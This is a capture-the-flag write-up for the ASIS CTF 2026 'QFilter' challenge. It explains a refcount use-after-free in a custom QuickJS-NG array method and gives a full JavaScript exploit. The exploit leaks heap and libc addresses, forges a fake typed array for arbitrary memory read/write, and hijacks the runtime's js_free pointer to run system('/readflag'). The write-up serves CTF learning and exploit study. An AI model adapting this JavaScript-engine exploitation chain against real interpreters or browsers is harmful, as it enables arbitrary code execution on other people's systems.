---
来源: https://ctfbase.com/writeup/20260829_asisctf2026_qfilter
类型: raw
获取日期: 2026-09-12
---

# QFilter (asisctf2026, hard)

tags: quickjs, quickjs_ng, javascript_engine, use_after_free, typed_array, got_overwrite

# QFilter — asisctf2026

## Description

> Need a custom Filter? Please be my guest.

- Archive: `https://asisctf.com/tasks/QFilter_c9b8d86ebc59fcd1d7b9bf68ce3d9cb7b0f0f476.txz`
- Remote: `nc 65.109.208.46 1337`

English summary: the remote wrapper accepts JavaScript until `-- EOF --`, then runs `timeout 3 ./qjs` on a custom QuickJS-NG 0.16.2 build. The goal is to escape the restricted runtime and make the SUID `/readflag` helper print the flag.

## Analysis

The service is a `socat`/Python wrapper around a custom `qjs` binary. Important environment facts:

- scripts are read until `-- EOF --` and executed with `timeout 3 ./qjs`
- `std` and `os` were compiled in, but the custom module loader always rejects imports
- `gc()` and a few harmless globals are exposed, so import-based escapes do not work

The real bug is the custom `Array.prototype.customFilter` added in `quickjs.c`. Its reconstructed logic was:

1. require a callback
2. verify `this` is an array
3. cache `len = p->u.array.count` and `elements = p->u.array.u.values`
4. set `is_object` only from `elements[0].tag == JS_TAG_OBJECT`
5. for each element, copy `val = elements[i]`, call `JS_DupValue` only if `is_object`, invoke the callback, then always `JS_FreeValue(ctx, val)`

That creates a refcount bug: if the first element is not an object, later refcounted elements are freed without first taking an owning reference, even though the array still points to them. With an array like `[1, victim]`, `victim` can be released while `arr[1]` remains as a dangling `JSValue`.

There is also a stale-pointer property because both `len` and `elements` are cached before the callback runs, but the final exploit only needed the refcount underflow path.

One subtle but critical nuance was that reading the dangling slot too early breaks reclaim reliability. Accessing an array element duplicates the stale `JSValue`, which increases the reused block's refcount and sabotages the intended free/reclaim sequence.

## Solution

### 1. Build a safe first dangling window and leak engine pointers

The first dangling-string window was used only for information disclosure, not for the final fake object. A visible `Float64Array` over a shared `ArrayBuffer` provided a stable read target, while the dangling string exposed nearby heap-ish memory:

- recover a repeatable `WINBASE` by scanning the leaked string for pointer-shaped values
- leak the backing-store pointer `B` of the shared `ArrayBuffer`

This gave a known writable memory region for later fake typed-array metadata.

### 2. Create a second dangling window without touching it

For the actual takeover:

- create a second `[1, "D".repeat(24)]` dangling-string window
- place an inline victim object as `new Float64Array(buf2)` inside `[1, victim]`
- call `customFilter` to free that victim while the array still keeps a stale reference

The important operational rule was: do **not** read the victim dangling slot before freeing the victim. Doing so duplicated the stale `JSValue` and ruined reclamation.

### 3. Reclaim the freed `JSObject` with controlled data

After freeing the victim typed-array object:

- allocate a sacrificial string
- allocate `new ArrayBuffer(0x48)`

In this allocator setup, the new ArrayBuffer data chunk reclaimed the freed 0x48-byte victim `JSObject` block. That reclaimed memory was filled with a forged `Float64Array` object header.

### 4. Forge a fake typed-array metadata chain inside controlled buffer data

The forged object itself only needed to point into attacker-controlled memory. The full fake typed-array chain was stored inside the shared `ArrayBuffer` data at leaked address `B`:

- fake `JSTypedArray`
- fake buffer object reference chain
- controlled `double_ptr`
- large element count

Once `victim_arr[1]` was reinterpreted as this fake object, reads and writes through `fake[0]` became arbitrary 8-byte memory access.

### 5. Derive `JSRuntime`, PIE base, and libc

The final remote exploit used fixed deltas from the leaked `WINBASE`:

- `rt = WINBASE - 0x2b948`
- `base = *(rt) - 0x2975f`

Then it leaked libc through GOT entries:

- `free@got = base + 0x149c88`
- `malloc@got = base + 0x149bf0`

For Ubuntu 26.04 / glibc 2.43:

- `free` offset `0xb55e0`
- `malloc` offset `0xb5090`
- `system` offset `0x5c560`

Matching leaks from both GOT entries confirmed the libc base.

### 6. Hijack `js_free` into `system("/readflag")`

The last step wrote `/readflag\0` into controlled `ArrayBuffer` data, then overwrote:

- `rt->malloc_state.opaque`
- `rt->mf.js_free`

After that, freeing a large `ArrayBuffer` invoked `mf.js_free(opaque, ptr)`, which had become effectively `system("/readflag")`. The service printed the flag repeatedly because later frees also passed through the hijacked `js_free` hook.

```javascript
let pad = new ArrayBuffer(2 * 1024 * 1024); gc(); gc();
function noop(x){}

let b8 = new ArrayBuffer(8);
let f64 = new Float64Array(b8);
let u32 = new Uint32Array(b8);
function i2f(lo, hi){ u32[0]=lo; u32[1]=hi; return f64[0]; }
function f2lo(f){ f64[0]=f; return u32[0]; }
function f2hi(f){ f64[0]=f; return u32[1]; }
function rq(win, off) { let v=0n; for (let k=off+7;k>=off;k--) v=(v<<8n)|BigInt(win.charCodeAt(k)); return v; }
function put64arr(arr, off, v){ for (let i=0;i<8;i++) arr[off+i] = Number((v >> BigInt(8*i)) & 0xffn); }
function put32arr(arr, off, v){ arr[off]=v&0xff; arr[off+1]=(v>>>8)&0xff; arr[off+2]=(v>>>16)&0xff; arr[off+3]=(v>>>24)&0xff; }

let buf2 = new ArrayBuffer(0x400);
let bw = new Uint8Array(buf2);

// Window #1: safe visible view for WINBASE + B leak
let d1arr = [1, "C".repeat(24)];
d1arr.customFilter(noop);
let visible = new Float64Array(buf2);
let d1 = d1arr[1];
let B = rq(d1, 16);
let N = 0x20000;
let WINBASE = 0n, votes = 0;
{
  let mv = new Map();
  for (let i=0;i<N;i+=8) {
    let b0=d1.charCodeAt(i), b1=d1.charCodeAt(i+1), b2=d1.charCodeAt(i+2), b3=d1.charCodeAt(i+3);
    let b4=d1.charCodeAt(i+4), b5=d1.charCodeAt(i+5), b6=d1.charCodeAt(i+6), b7=d1.charCodeAt(i+7);
    if (b7!=0 || b6!=0 || b5<0x10 || b5>0x7f) continue;
    let v = BigInt(b0) | (BigInt(b1)<<8n) | (BigInt(b2)<<16n) | (BigInt(b3)<<24n) |
            (BigInt(b4)<<32n) | (BigInt(b5)<<40n);
    let D = v - BigInt(i);
    let c = mv.get(D);
    mv.set(D, (c===undefined)?1:c+1);
  }
  mv.forEach((c, Dk) => { if (c > votes) { votes = c; WINBASE = Dk; } });
}
if (votes < 20) throw 'window1';
print('[+] WINBASE=0x' + WINBASE.toString(16));
print('[+] B=0x' + B.toString(16));

// Window #2: victim view over SAME buffer; do not touch before free
let d2arr = [1, "D".repeat(24)];
d2arr.customFilter(noop);
let victim_arr = [1, new Float64Array(buf2)];

// free victim while refcount is still 1, then reclaim with AB data
let z1 = "B".repeat(24);
victim_arr.customFilter(noop);
z1 = 0;
let forge = new ArrayBuffer(0x48);
let fw = new Uint8Array(forge);
for (let i=0;i<0x48;i++) fw[i] = 0;
fw[0] = 0x40;

// fake typed-array write chain lives in buf2 data (B)
const TA = 0x00, BUFO = 0x40, ABF = 0x80, CMD = 0x100;
put64arr(bw, TA + 0x18, B + BigInt(BUFO));
put32arr(bw, TA + 0x20, 0);
put32arr(bw, TA + 0x24, 0x400);
put32arr(bw, TA + 0x28, 0);
put64arr(bw, BUFO + 0x30, B + BigInt(ABF));
put32arr(bw, ABF + 0, 0x4000);
put32arr(bw, ABF + 4, 0xffffffff);
bw[ABF + 8] = 0; bw[ABF + 9] = 0; bw[ABF + 10] = 0;

// fake object over the reclaimed victim block
fw[0x12] = 33; fw[0x13] = 0;
put64arr(fw, 0x30, B + BigInt(TA));
put64arr(fw, 0x38, B);
put32arr(fw, 0x40, 0x2000);

let fake = victim_arr[1];
function setptr(v){ put64arr(fw, 0x38, v); }
function read64(addr){ setptr(addr); return fake[0]; }
function readlo(addr){ setptr(addr); return f2lo(fake[0]); }
function readhi(addr){ setptr(addr); return f2hi(fake[0]); }
function write64(addr, lo, hi){ setptr(addr); u32[0]=lo; u32[1]=hi; fake[0] = f64[0]; }

// primitive self-test
write64(B + 0x200n, 0xdeadbeef, 0x11223344);
if (!(bw[0x200]===0xef && bw[0x201]===0xbe && bw[0x202]===0xad && bw[0x203]===0xde && bw[0x204]===0x44 && bw[0x205]===0x33)) throw 'rw';
print('[+] RW OK');

// direct rt delta, derive base from rt->mf[0]
let rt = WINBASE - 0x2b948n;
let base = ((BigInt(readhi(rt))<<32n)|BigInt(readlo(rt))) - 0x2975fn;
if (readlo(base) !== 0x464c457f) { print('[-] base check failed'); throw 'base'; }
print('[+] rt=0x' + rt.toString(16));
print('[+] qjs=0x' + base.toString(16));

// libc via GOT
let gf = read64(base + 0x149c88n);
let gm = read64(base + 0x149bf0n);
let libc1 = ((BigInt(f2hi(gf))<<32n)|BigInt(f2lo(gf))) - 0xb55e0n;
let libc2 = ((BigInt(f2hi(gm))<<32n)|BigInt(f2lo(gm))) - 0xb5090n;
if (libc1 !== libc2 || (libc1 & 0xfffn) !== 0n) throw 'libc';
let system = libc1 + 0x5c560n;
print('[+] libc=0x' + libc1.toString(16));

// /readflag\0 inside buf2 data
let cmdBytes = [0x2f,0x72,0x65,0x61,0x64,0x66,0x6c,0x61,0x67,0];
for (let i=0;i<cmdBytes.length;i++) bw[CMD+i] = cmdBytes[i];
let cmdAddr = B + BigInt(CMD);

// hijack and trigger large-block free => system(cmdAddr)
write64(rt + 0x40n, Number(cmdAddr & 0xffffffffn), Number((cmdAddr >> 32n) & 0xffffffffn));
write64(rt + 0x10n, Number(system & 0xffffffffn), Number((system >> 32n) & 0xffffffffn));
print('[+] trigger');
let trig = new ArrayBuffer(0x1000);
trig = 0;
```